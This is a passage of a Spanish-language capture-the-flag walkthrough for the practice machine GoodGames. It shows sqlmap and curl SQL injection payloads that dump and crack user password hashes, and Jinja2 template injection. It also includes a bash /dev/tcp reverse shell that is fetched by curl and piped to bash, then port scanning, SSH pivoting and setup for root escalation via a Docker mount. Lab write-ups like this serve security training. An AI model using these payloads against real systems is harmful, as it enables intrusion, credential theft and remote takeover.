[19:28:42] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[19:28:42] [INFO] fetching database names
[19:28:42] [INFO] fetching number of databases
[19:28:42] [INFO] resumed: 2
[19:28:42] [INFO] resumed: information_schema
[19:28:42] [INFO] resumed: main
available databases [2]:
[*] information_schema
[*] main

[19:28:42] [INFO] fetching columns for table 'user' in database 'main'
[19:28:42] [INFO] resumed: 4
[19:28:42] [INFO] resumed: email
[19:28:42] [INFO] resumed: id
[19:28:42] [INFO] resumed: name
[19:28:42] [INFO] resumed: password
[19:28:42] [INFO] fetching entries for table 'user' in database 'main'
[19:28:42] [INFO] fetching number of entries for table 'user' in database 'main'
[19:28:42] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                                                                                  
[19:28:48] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
2
[19:29:00] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)                                                                         
a
[19:29:22] [INFO] adjusting time delay to 1 second due to good response times
dmin
[19:29:39] [INFO] retrieved: admin@goodgames.htb
[19:31:00] [INFO] retrieved: 1
[19:31:03] [INFO] retrieved: 2b22337f218b2d82dfc3b6f77e7cb8ec
[19:33:16] [INFO] retrieved: test
[19:33:35] [INFO] retrieved: test@test.com
[19:34:39] [INFO] retrieved: 2
[19:34:44] [INFO] retrieved: cc03e747a6afbbcbf8be7668acfebee5
[19:37:25] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[19:37:26] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[19:37:26] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[19:37:26] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[19:37:26] [INFO] starting 5 processes 
[19:37:34] [INFO] cracked password 'test123' for hash 'cc03e747a6afbbcbf8be7668acfebee5'                                                                                                                        
Database: main                                                                                                                                                                                                  
Table: user
[2 entries]
+----+---------------------+--------+--------------------------------------------+

| id | email               | name   | password                                   |
+----+---------------------+--------+--------------------------------------------+

| 1  | admin@goodgames.htb | admin  | 2b22337f218b2d82dfc3b6f77e7cb8ec           |
| 2  | test@test.com       | test   | cc03e747a6afbbcbf8be7668acfebee5 (test123) |
+----+---------------------+--------+--------------------------------------------+

[19:37:35] [INFO] table 'main.`user`' dumped to CSV file '/root/.local/share/sqlmap/output/10.10.11.130/dump/main/user.csv'
[19:37:35] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.10.11.130'

[*] ending @ 19:37:35 /2024-10-14/
```
Listo, obtuvimos la contraseña del administrador.

Si analizas la respuesta de **sqlmap**, parece que identifico que las contraseñas fueron encriptadas con **MD5** y hasta crackeo la contraseña de nuestro **usuario test**.

Guardemos este dato para más adelante.

### Aplicando Inyecciones SQL con curl {#SQL5}

Otra forma en la que podemos aplicar las **inyecciones SQL** es con **curl**.

Tan solo debemos indicarle como data los campos que necesita el login para que funcione, ahí mismo incluiremos la **SQLi**.

Probémoslo:
```bash
curl -s -X POST http://10.10.11.130/login --data "email=test1@test.com' or 1=1-- -&password=test123"
<!DOCTYPE html>

<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <title>GoodGames | Login Success</title>

    <meta name="description" content="GoodGames - Bootstrap template for communities and games store">
...
...
...
```
Funciono, pero obtenemos toda la respuesta y eso no es óptimo.

Si recordamos, las inyecciones se reproducen junto a la palabra **Welcome**, ósea, que podemos usar **grep** para que nos muestre solo esa parte de la respuesta:
```bash
curl -s -X POST http://10.10.11.130/login --data "email=test1@test.com' or 1=1-- -&password=test123" | grep "Welcome"
                    <h2 class="h4">Welcome admintest</h2>
```
Ahí está.

Pero nosotros solo queremos la pura respuesta de la inyección, entonces, usaremos **awk** para solamente obtener ese campo y eliminamos las etiquetas también con **awk**:
```bash
curl -s -X POST http://10.10.11.130/login --data "email=test1@test.com' or 1=1-- -&password=test123" | grep "Welcome" | awk 'NF{print $NF}' | awk '{print $1}' FS="<"
admintest
```
Genial, así queda mucho mejor.

Vamos a probar las mismas inyecciones que ya aplicamos con **BurpSuite**.

La primera que aplicamos, fue una inyección con la que obtuvimos el nombre de la BD actual:
```bash
curl -s -X POST http://10.10.11.130/login --data "email=test1@test.com' union select 1,2,3,database()-- -&password=test123" | grep "Welcome" | awk 'NF{print $NF}' | awk '{print $1}' FS="<"
main
```
Funciona bien.

Ahora, obtengamos las BD existentes:
```bash
curl -s -X POST http://10.10.11.130/login --data "email=test1@test.com' union select 1,2,3,concat(schema_name, ':') from information_schema.schemata-- -&password=test123" | grep "Welcome" | awk 'NF{print $NF}' | awk '{print $1}' FS="<"
information_schema:main:
```
Aquí usamos `concat()` para que la respuesta sea más entendible.

Igual podemos obtener todas las tablas de las BDs:
```bash
curl -s -X POST http://10.10.11.130/login --data "email=test1@test.com' union select 1,2,3,concat(table_name, ':') from information_schema.tables-- -&password=test123" | grep "Welcome" | awk 'NF{print $NF}' | awk '{print $1}' FS="<"
ADMINISTRABLE_ROLE_AUTHORIZATIONS:APPLICABLE_ROLES:CHARACTER_SETS:CHECK_CONSTRAINTS:COLLATIONS:COLLATION_CHARACTER_SET_APPLICABILITY:COLUMNS:COLUMNS_EXTENSIONS:COLUMN_PRIVILEGES:COLUMN_STATISTICS:ENABLED_ROLES:ENGINES:EVENTS:FILES:INNODB_BUFFER_PAGE:INNODB_BUFFER_PAGE_LRU:INNODB_BUFFER_POOL_STATS:INNODB_CACHED_INDEXES:INNODB_CMP:INNODB_CMPMEM:INNODB_CMPMEM_RESET:INNODB_CMP_PER_INDEX:INNODB_CMP_PER_INDEX_RESET:INNODB_CMP_RESET:INNODB_COLUMNS:INNODB_DATAFILES:INNODB_FIELDS:INNODB_FOREIGN:INNODB_FOREIGN_COLS:INNODB_FT_BEING_DELETED:INNODB_FT_CONFIG:INNODB_FT_DEFAULT_STOPWORD:INNODB_FT_DELETED:INNODB_FT_INDEX_CACHE:INNODB_FT_INDEX_TABLE:INNODB_INDEXES:INNODB_METRICS:INNODB_SESSION_TEMP_TABLESPACES:INNODB_TABLES:INNODB_TABLESPACES:INNODB_TABLESPACES_BRIEF:INNODB_TABLESTATS:INNODB_TEMP_TABLE_INFO:INNODB_TRX:INNODB_VIRTUAL:KEYWORDS:KEY_COLUMN_USAGE:OPTIMIZER_TRACE:PARAMETERS:PARTITIONS:PLUGINS:PROCESSLIST:PROFILING:REFERENTIAL_CONSTRAINTS:RESOURCE_GROUPS:ROLE_COLUMN_GRANTS:ROLE_ROUTINE_GRANTS:ROLE_TABLE_GRANTS:ROUTINES:SCHEMATA:SCHEMATA_EXTENSIONS:SCHEMA_PRIVILEGES:STATISTICS:ST_GEOMETRY_COLUMNS:ST_SPATIAL_REFERENCE_SYSTEMS:ST_UNITS_OF_MEASURE:TABLES:TABLESPACES:TABLESPACES_EXTENSIONS:TABLES_EXTENSIONS:TABLE_CONSTRAINTS:TABLE_CONSTRAINTS_EXTENSIONS:TABLE_PRIVILEGES:TRIGGERS:USER_ATTRIBUTES:USER_PRIVILEGES:VIEWS:VIEW_ROUTINE_USAGE:VIEW_TABLE_USAGE:blog:blog_comments:user:
```
Son demasiadas y solo nos importa la **BD main**.

Obtengamos las tablas de esa BD:
```bash
curl -s -X POST http://10.10.11.130/login --data "email=test1@test.com' union select 1,2,3,concat(table_name, ':') from information_schema.tables where table_schema = 'main'-- -&password=test123" | grep "Welcome" | awk 'NF{print $NF}' | awk '{print $1}' FS="<"
blog:blog_comments:user:
```
La de interés es la tabla **user**.

Veamos las columnas de esa tabla:
```bash
curl -s -X POST http://10.10.11.130/login --data "email=test1@test.com' union select 1,2,3,concat(column_name, ':') from information_schema.columns where table_schema = 'main' and table_name = 'user'-- -&password=test123" | grep "Welcome" | awk 'NF{print $NF}' | awk '{print $1}' FS="<"
email:id:name:password:
```
Vamos bien.

Por último, vamos a dumpear los datos de esas columnas:
```bash
curl -s -X POST http://10.10.11.130/login --data "email=test1@test.com' union select 1,2,3,concat(email, ':', id, ':', name, ':', password, ':') from user-- -&password=test123" | grep "Welcome" | awk 'NF{print $NF}' | awk '{print $1}' FS="<"
admin@goodgames.htb:1:admin:2b22337f218b2d82dfc3b6f77e7cb8ec:test@test.com:2:test:cc03e747a6afbbcbf8be7668acfebee5:
```
Listo, pero solo nos interesan los datos del administrador.

Podemos eliminar los datos extras, solamente agregando un salto de línea en el `concat()`:
```bash
curl -s -X POST http://10.10.11.130/login --data "email=test1@test.com' union select 1,2,3,concat(email, ':', id, ':', name, ':', password, ':', '\n') from user-- -&password=test123" | grep "Welcome" | awk 'NF{print $NF}' | awk '{print $1}' FS="<"
admin@goodgames.htb:1:admin:2b22337f218b2d82dfc3b6f77e7cb8ec:
```
Continuemos.

### Crackeando Hash Obtenido de la Base de Datos con JohnTheRipper {#MD5}

Ya sabemos que el hash de la contraseña del administrador fue hecho con **MD5**.

Pero podemos identificar el tipo de encriptación, de acuerdo con la cantidad de caracteres. Por ejemplo, los **hash MD5** tienen 32 caracteres: 
```bash
echo -n "2b22337f218b2d82dfc3b6f77e7cb8ec" | wc -c
32
```
Son 32.

De igual forma, podemos usar la herramienta **hash-identifier** para que identifique el tipo de **hash** que tenemos:
```bash
hash-identifier
/usr/share/hash-identifier/hash-id.py:13: SyntaxWarning: invalid escape sequence '\ '
  logo='''   #########################################################################
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: 2b22337f218b2d82dfc3b6f77e7cb8ec

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))

Least Possible Hashs:
[+] RAdmin v2.x
[+] NTLM
[+] MD4
[+] MD2
[+] MD5(HMAC)
[+] MD4(HMAC)
[+] MD2(HMAC)
[+] MD5(HMAC(Wordpress))
[+] Haval-128
[+] Haval-128(HMAC)
[+] RipeMD-128
[+] RipeMD-128(HMAC)
[+] SNEFRU-128
[+] SNEFRU-128(HMAC)
[+] Tiger-128
[+] Tiger-128(HMAC)
[+] md5($pass.$salt)
[+] md5($salt.$pass)
```
El primer resultado es el más acertado.

Como ya identificamos que es un **hash MD5**, podemos usar **JohnTheRipper** para tratar de crackearlo, pero observa lo que pasa cuando lo usamos:
```bash
john -w:/usr/share/wordlists/rockyou.txt hash
Warning: detected hash type "LM", but the string is also recognized as "dynamic=md5($p)"
Use the "--format=dynamic=md5($p)" option to force loading these as that type instead
Warning: detected hash type "LM", but the string is also recognized as "HAVAL-128-4"
Use the "--format=HAVAL-128-4" option to force loading these as that type instead
Warning: detected hash type "LM", but the string is also recognized as "MD2"
Use the "--format=MD2" option to force loading these as that type instead
Warning: detected hash type "LM", but the string is also recognized as "mdc2"
Use the "--format=mdc2" option to force loading these as that type instead
Warning: detected hash type "LM", but the string is also recognized as "mscash"
Use the "--format=mscash" option to force loading these as that type instead
Warning: detected hash type "LM", but the string is also recognized as "mscash2"
Use the "--format=mscash2" option to force loading these as that type instead
Warning: detected hash type "LM", but the string is also recognized as "NT"
Use the "--format=NT" option to force loading these as that type instead
Warning: detected hash type "LM", but the string is also recognized as "Raw-MD4"
Use the "--format=Raw-MD4" option to force loading these as that type instead
Warning: detected hash type "LM", but the string is also recognized as "Raw-MD5"
Use the "--format=Raw-MD5" option to force loading these as that type instead
```
Esto pasa porque no le indicamos que el **hash** es del formato **MD5**, e incluso en la respuesta nos lo indica.

Agreguemos ese parámetro y tratemos de crackear:
```bash
john -w:/usr/share/wordlists/rockyou.txt hash --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 SSE2 4x3])
Warning: no OpenMP support for this hash type, consider --fork=5
Press 'q' or Ctrl-C to abort, almost any other key for status
superadministrator (?)     
1g 0:00:00:00 DONE (2024-10-14 15:09) 4.166g/s 14484Kp/s 14484Kc/s 14484KC/s superarely1993..super_haven
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```
Fue muy rápido.

Probemos esta contraseña en el login del **Flask Volt** y veamos si funciona:

<p align="center">
<img src="/assets/images/htb-writeup-goodgames/Captura36.png">
</p>

Funciono, estamos dentro.

### Aplicando Server Side Template Injection (SSTI) {#SSTI}

Vamos a analizar esta página.

<p align="center">
<img src="/assets/images/htb-writeup-goodgames/Captura37.png">
</p>

Aparecen algunos usuarios, miembros del equipo de desarrollo y sus tareas que faltan completar.

No hay más que eso, pero si nos vamos a las configuraciones, parece que podemos cambiar algunos datos.

Probemos a meter cosas random:

<p align="center">
<img src="/assets/images/htb-writeup-goodgames/Captura38.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-goodgames/Captura39.png">
</p>

Parece que nada más se cambió el nombre.

Es posible que esté interpretando los datos que estamos metiendo. Si es el caso, es posible que podamos aplicar una **Server Side Template Injection (SSTI)**.

¿Qué es **Server Side Template Injection (SSTI)**?

| **Server Side Template Injection (SSTI)** |
|:-----------:|
| *La inyección de plantillas del lado del servidor es una vulnerabilidad que se produce cuando un atacante puede inyectar código malicioso en una plantilla que se ejecuta en el servidor. Esta vulnerabilidad puede encontrarse en varias tecnologías, incluida Jinja.* |

Aquí puedes ver más información:
* <a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection" target="_blank">HackTricks: SSTI (Server Side Template Injection)</a>

En ese blog de **HackTricks**, viene cómo puedes comprobar si una página es vulnerable a este ataque.

La idea, es usar una operación matemática simple dentro de un campo que identifiquemos este interpretando lo que pongamos. Si la página muestra el resultado de la operación, entonces sería vulnerable a las **SSTI**.

Intentémoslo:

<p align="center">
<img src="/assets/images/htb-writeup-goodgames/Captura40.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-goodgames/Captura41.png">
</p>

Observa que sí resolvió la operación matemática.

En el mismo blog de **HackTricks**, hay varias formas en las que se pueden aplicar las **SSTI** dependiendo de las tecnologías que use la página web.

Para este caso, recordemos que está usando **Python**, por lo que una buena opción, es probar las **SSTI** para **Jinja**: <a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#jinja2-python" target="_blank">HackTricks: SSTI - jinja2 Python</a>

Probemos una **SSTI** que sea corta:

<p align="center">
<img src="/assets/images/htb-writeup-goodgames/Captura42.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-goodgames/Captura43.png">
</p>

Funciono.

### Ganando Acceso a la Máquina Usando una SSTI de Jinja2 Python {#Jinja2}

Con esa misma **SSTI**, podemos ejecutar cualquier comando, pero lo ideal sería usar una **Reverse Shell** para conectarnos a la máquina.

Podemos intentar enviar una **traza ICMP** a nuestra máquina desde la **SSTI**.

Abre una captura de paquetes **ICMP** con **tcpdump**:
```bash
tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
```

Usa **ping** en la **SSTI** y envíala:

<p align="center">
<img src="/assets/images/htb-writeup-goodgames/Captura44.png">
</p>

Observa el resultado:
```bash
tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
16:39:15.738225 IP 10.10.11.130 > Tu_IP: ICMP echo request, id 288, seq 1, length 64
16:39:15.738253 IP Tu_IP > 10.10.11.130: ICMP echo reply, id 288, seq 1, length 64
16:39:16.739560 IP 10.10.11.130 > Tu_IP: ICMP echo request, id 288, seq 2, length 64
16:39:16.739584 IP Tu_IP > 10.10.11.130: ICMP echo reply, id 288, seq 2, length 64
16:39:17.742335 IP 10.10.11.130 > Tu_IP: ICMP echo request, id 288, seq 3, length 64
16:39:17.742354 IP Tu_IP > 10.10.11.130: ICMP echo reply, id 288, seq 3, length 64
16:39:18.741963 IP 10.10.11.130 > Tu_IP: ICMP echo request, id 288, seq 4, length 64
16:39:18.741980 IP Tu_IP > 10.10.11.130: ICMP echo reply, id 288, seq 4, length 64
16:39:19.744322 IP 10.10.11.130 > Tu_IP: ICMP echo request, id 288, seq 5, length 64
16:39:19.744341 IP Tu_IP > 10.10.11.130: ICMP echo reply, id 288, seq 5, length 64
^C
10 packets captured
10 packets received by filter
0 packets dropped by kernel
```
Entonces, sí podemos alcanzar a nuestra máquina.

Podemos ganar acceso de dos formas:
* Usando una **Reverse Shell** desde la **SSTI**.
* Creando una **Reverse Shell** para guardarla en un **archivo HTML** y que la **SSTI** lo interprete.

#### Aplicando Reverse Shell desde la SSTI {#revShell}

Vamos primero por la más fácil.

Abre una **netcat**:
```bash
nc -nlvp 443
listening on [any] 443 ...
```

Usa nuestra **Reverse Shell** de confianza en la **SSTI** y ejecútala:

<p align="center">
<img src="/assets/images/htb-writeup-goodgames/Captura45.png">
</p>

Observa la **netcat**:
```bash
nc -nlvp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [10.10.11.130] 34808
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@3a453ab39d3d:/backend# whoami
whoami
root
```

#### Usando Plantilla HTML que Almacena una Reverse Shell para Ganar Acceso a la Máquina {#revShell2}

Primero, vamos a guardar la **Reverse Shell** en un archivo que llamamos **index.html**:
```bash
#!/bin/bash
bash -i >& /dev/tcp/Tu_IP/443 0>&1
```

Ahora, abre un servidor de **Python**:
```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Abre una **netcat**:
```bash
nc -nlvp 443
listening on [any] 443 ...
```

Y en la **SSTI**, vamos a usar **curl** para que entre a nuestro servidor y ahí mismo, le indicamos que lo que encuentre, lo interprete con **Bash**:

<p align="center">
<img src="/assets/images/htb-writeup-goodgames/Captura46.png">
</p>

Observa la **netcat**:
```bash
nc -nlvp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [10.10.11.130] 34808
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@3a453ab39d3d:/backend# whoami
whoami
root
```
Listo, hemos ganado acceso a la máquina.

## Post Explotación {#Post}

### Enumeración del Contenedor de Docker y Aplicando Pivoting al Usuario Augustus {#Docker}

Si te das cuenta, estamos dentro de un contenedor de **Docker**. Lo podemos comprobar enumerándolo.

Veamos qué nos dice **hostname**:
```bash
root@3a453ab39d3d:/backend# hostname -I
hostname -I
172.19.0.2
```
Observa la IP, es de un segmento común de **Docker**.

Probemos con **ifconfig**:
```bash
root@3a453ab39d3d:/backend# ifconfig
ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.19.0.2  netmask 255.255.0.0  broadcast 172.19.255.255
        ether 02:42:ac:13:00:02  txqueuelen 0  (Ethernet)
        RX packets 267727  bytes 14762831 (14.0 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 273572  bytes 36415809 (34.7 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```
Está comprobado que es un **contenedor de Docker**.

Empecemos a enumerar lo que hay.

Mira los archivos de este directorio:
```bash
root@3a453ab39d3d:/backend# ls
Dockerfile  project  requirements.txt
```

Observa el contenido del **archivo requirements.txt**:
```bash
root@3a453ab39d3d:/backend# cat requirements.txt
flask==2.0.1
flask_login==0.5.0
flask_migrate==3.1.0
flask_wtf==0.15.1
flask_sqlalchemy==2.5.1
sqlalchemy==1.4.23
email_validator==1.1.3
python-decouple==3.4
gunicorn==20.1.0
jinja2==3.0.1
flask-restx==0.5.1
```
Ahí está el **Jinja2**.

Normalmente, podemos ver que existe el **directorio home**, entremos ahí:
```bash
root@3a453ab39d3d:/# cd home
root@3a453ab39d3d:/home# ls
augustus
root@3a453ab39d3d:/home# cd augustus
root@3a453ab39d3d:/home/augustus# ls
user.txt
root@3a453ab39d3d:/home/augustus# cat user.txt
...
```
Justo aquí, existe otro directorio de un usuario llamado **augustus** y ahí está la flag del usuario.

Investiguemos si hay más usuarios en el `/etc/passwd`:
```bash
root@3a453ab39d3d:/home/augustus# cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/bin/false
```
No veo ninguno, es más, no aparece el **usuario augustus**.

La máquina principal tiene la primera IP del segmento de **Docker**, veamos si lo podemos alcanzar:
```bash
root@3a453ab39d3d:/home/augustus# ping -c 4 172.19.0.1
PING 172.19.0.1 (172.19.0.1) 56(84) bytes of data.
64 bytes from 172.19.0.1: icmp_seq=1 ttl=64 time=0.068 ms
64 bytes from 172.19.0.1: icmp_seq=2 ttl=64 time=0.088 ms
64 bytes from 172.19.0.1: icmp_seq=3 ttl=64 time=0.089 ms
64 bytes from 172.19.0.1: icmp_seq=4 ttl=64 time=0.100 ms

--- 172.19.0.1 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3049ms
rtt min/avg/max/mdev = 0.068/0.086/0.100/0.013 ms
```
Sí podemos.

Curiosamente, en el **directorio home** se encuentra el directorio del **usuario augustus** que ya vimos, pero dicho usuario no existe en el `/etc/passwd`.

Es posible que estemos dentro de una montura y podemos comprobarlo con **mount** y **grep**:
```bash
root@3a453ab39d3d:/home/augustus# mount | grep home
/dev/sda1 on /home/augustus type ext4 (rw,relatime,errors=remount-ro)
```
Con esto comprobamos que `/home/augustus` es una montura.

Otra cosa que podemos hacer, es escanear los puertos para saber si hay uno del que nos podamos aprovechar.

Ya vimos que está abierto el puerto 80, pero hay que ver que otro está abierto.

Investigando por ahí, encontré un **script de Bash** que puede escanear puertos:
* <a href="https://catonmat.net/tcp-port-scanner-in-bash" target="_blank">TCP Port Scanner in Bash</a>

Lo único que vamos a modificar, es la parte de los puertos cerrados, ya que no nos interesa verlos en el resultado.

Ejecútalo como un oneliner:
```bash
root@3a453ab39d3d:/home/augustus# for port in {1..65535}; do echo > /dev/tcp/172.19.0.1/$port && echo "Port: $port open"; done 2>/dev/null
Port: 22 open
Port: 80 open
```
Son 2 puertos abiertos y ahí está el puerto 22 que es del **servicio SSH**.

Como ya sabemos que existe el **usuario augustus** y estamos dentro de una montura de este usuario, quiere decir que podemos probar si este usuario es válido.

Y como no tenemos una contraseña para este usuario, probaremos la que ya tenemos con este usuario:
```bash
root@3a453ab39d3d:/home/augustus# ssh augustus@172.19.0.1
The authenticity of host '172.19.0.1 (172.19.0.1)' can't be established.
ECDSA key fingerprint is SHA256:AvB4qtTxSVcB0PuHwoPV42/LAJ9TlyPVbd7G6Igzmj0.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '172.19.0.1' (ECDSA) to the list of known hosts.
augustus@172.19.0.1's password: 
Linux GoodGames 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
augustus@GoodGames:~$ whoami
augustus
```
Excelente, pudimos entrar.

### Escalando Privilegios Abusando de la Montura del Usuario Augustus {#Privesc}

Veamos si tenemos algún permiso:
```bash
augustus@GoodGames:~$ sudo -l
-bash: sudo: command not found
```
No existe el comando **sudo**.

Probemos si estamos en un grupo:
```bash
augustus@GoodGames:~$ id
uid=1000(augustus) gid=1000(augustus) groups=1000(augustus)
```
Ninguno.

Por curiosidad, veamos la información de la interfaz con **ifconfig**:
```bash
augustus@GoodGames:~$ ifconfig
-bash: ifconfig: command not found
```
Tampoco existe este comando.

Quizá con `ip a`:
```bash
augustus@GoodGames:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b0:ce:9e brd ff:ff:ff:ff:ff:ff
    inet 10.10.11.130/24 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb0:ce9e/64 scope global dynamic mngtmpaddr 
       valid_lft 86400sec preferred_lft 14400sec
    inet6 fe80::250:56ff:feb0:ce9e/64 scope link 
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:70:e1:68:2d brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
4: br-99993f3f3b6b: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:28:4e:70:48 brd ff:ff:ff:ff:ff:ff
    inet 172.19.0.1/16 brd 172.19.255.255 scope global br-99993f3f3b6b
       valid_lft forever preferred_lft forever
    inet6 fe80::42:28ff:fe4e:7048/64 scope link 
       valid_lft forever preferred_lft forever
6: veth5e72b6d@if5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-99993f3f3b6b state UP group default 
    link/ether fe:bb:9f:ac:1b:cc brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::fcbb:9fff:feac:1bcc/64 scope link 
       valid_lft forever preferred_lft forever
```
Bien, ahí aparece la IP de la máquina y el **contenedor de Docker**.

Veamos si hay algún binario con **permisos SUID** que podamos usar:
```bash
augustus@GoodGames:~$ find / -perm -4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/fusermount
/usr/bin/umount
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/mount
/usr/bin/su
```
Ninguno útil.

Como ahorita estamos en el **home** y sabemos que se hizo una montura de este directorio, quizá lo que pongamos aquí, se vea reflejado en el contenedor.

Probémoslo:
```bash
augustus@GoodGames:~$ pwd
/home/augustus
augustus@GoodGames:~$ echo "Hola, me puedes ver?" > test.txt
augustus@GoodGames:~$ ls
test.txt  user.txt
```
Creamos un archivo de texto.

Nos salimos para estar en el contenedor y vemos si podemos ver el archivo de texto:
```bash
augustus@GoodGames:~$ exit
logout
Connection to 172.19.0.1 closed.
root@3a453ab39d3d:/home/augustus# ls
test.txt  user.txt
root@3a453ab39d3d:/home/augustus# cat test.txt
Hola, me puedes ver?
```
Sí lo podemos ver.

Recuerda que en el contenedor somos **Root**, por lo que todo lo que metamos ahí, podemos modificarlo a gusto propio.

Veamos los permisos de la **Bash**
```bash
augustus@GoodGames:~$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1234376 Aug  4  2021 /bin/bash
```
Solo el **Root** puede usarlo.

Vamos a copiar el **binario Bash** en el **home** para que podamos modificarlo dentro del contenedor:
```bash
augustus@GoodGames:~$ cp /bin/bash .
augustus@GoodGames:~$ ls -la
total 1236
drwxr-xr-x 2 augustus augustus    4096 Oct 15 00:09 .
drwxr-xr-x 3 root     root        4096 Oct 19  2021 ..
-rwxr-xr-x 1 augustus augustus 1234376 Oct 15 00:09 bash
lrwxrwxrwx 1 root     root           9 Nov  3  2021 .bash_history -> /dev/null
